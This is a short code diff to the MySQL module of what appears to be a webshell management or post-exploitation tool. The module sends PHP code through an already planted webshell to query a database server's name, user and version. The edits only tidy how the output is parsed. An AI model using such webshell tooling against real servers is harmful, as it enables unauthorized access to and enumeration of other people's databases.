@@ -53,7 +53,7 @@ class Mysql():
         result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
-            database = content
+            database = content.split(",")[0]
             self.database = database
             Log.success(database)
         else:
@@ -68,7 +68,7 @@ class Mysql():
         result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
-            user = content
+            user = content.split(",")[0]
             self.user = user
             Log.success(user)
         else:
@@ -78,12 +78,12 @@ class Mysql():
         if self.version != "":
             Log.success(self.version)
             return
-        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select @@version';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select version()';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
         Log.info("Executing : \n%s" % code)
         result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
-            version = content
+            version = content.split(",")[0]
             self.version = version
             Log.success(version)
         else:
